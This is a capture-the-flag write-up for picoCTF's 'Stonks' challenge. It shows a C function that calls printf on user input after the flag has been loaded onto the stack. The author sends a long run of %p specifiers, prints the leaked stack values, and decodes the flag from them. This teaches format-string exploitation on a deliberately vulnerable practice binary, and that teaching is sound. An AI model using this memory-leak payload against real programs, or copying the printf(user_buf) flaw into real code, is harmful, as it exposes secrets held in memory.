# PicoCTF "Stonks"
Stonks is one of picoCTF's easiest binary exploitation challenges, and thus is only worth 20 points.

You are first, given the source code, which introduces a format string vulnerability after reading the flag file's contents onto the stack.
Below are the important parts of the source code, of which the buy_stonks function is our vulnerable function as it will have the flag within its stack frame
whilst also introducing a format string vulnerability.

```c
#include <stdlib.h>

//[...SNIP...]

int buy_stonks(Portfolio *p) {
	// [...SNIP...]
	char api_buf[FLAG_BUFFER];
	FILE *f = fopen("api","r");
	if (!f) {
		printf("Flag file not found. Contact an admin.\n");
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);

	// [...SNIP...]

	char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);
  
  // [...SNIP...]

	return 0;
}

// [...SNIP...]

int main(int argc, char *argv[])
{
  // [...SNIP...]
	
	scanf("%d", &resp);

	if (resp == 1) {
		buy_stonks(p);
	} else if (resp == 2) {
		view_portfolio(p);
	}

  // [...SNIP...]
}
```

By simply writing a lot of `%p` to the `user_buf`, we can read values off of the stack, in this case, the flag!
The input I used was as follows:
```
input was: %p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|
```
Which gives the following output, of which the flag can be located by searching for the bytes `"465443"`, which is `"CTF"` in little endian:
```
0x93ce390|0x804b000|0x80489c3|0xf7f09d80|0xffffffff|0x1|0x93cc160|0xf7f17110|0xf7f09dc7|(nil)|0x93cd180|0x2|0x93ce370|0x93ce390|0x6f636970|0x7b465443|0x306c5f49|0x345f7435|0x6d5f6c6c|0x306d5f79|0x5f79336e|0x32666331|0x30613130|0xfff0007d|0xf7f44af8|0xf7f17440|0xb5612500|0x1|(nil)|0xf7da6be9|0xf7f180c0|0xf7f095c0|0xf7f09000|0xfff0fed8|0xf7d9758d|0xf7f095c0|0x8048eca|0xfff0fee4|(nil)|0xf7f2bf09|0x804b000|0xf7f09000|0xf7f09e20|0xfff0ff18|0xf7f31d50|0xf7f0a890|0xb5612500|0xf7f09000|0x804b000|0xfff0ff18|0x8048c86|0x93cc160|0xfff0ff04|0xfff0ff18|0x8048be9|0xf7f093fc|(nil)|0xfff0ffcc|0xfff0ffc4|0x1|0x1|0x93cc160|0xb5612500|0xfff0ff30|(nil)|(nil)|0xf7d4cf21|0xf7f09000|
```
From here, simply grab all of the contiguous bytes until you hit a null byte, and reverse the endian, giving the flag: `picoCTF{I_l05t_4ll_my_m0n3y_1cf201a0}`


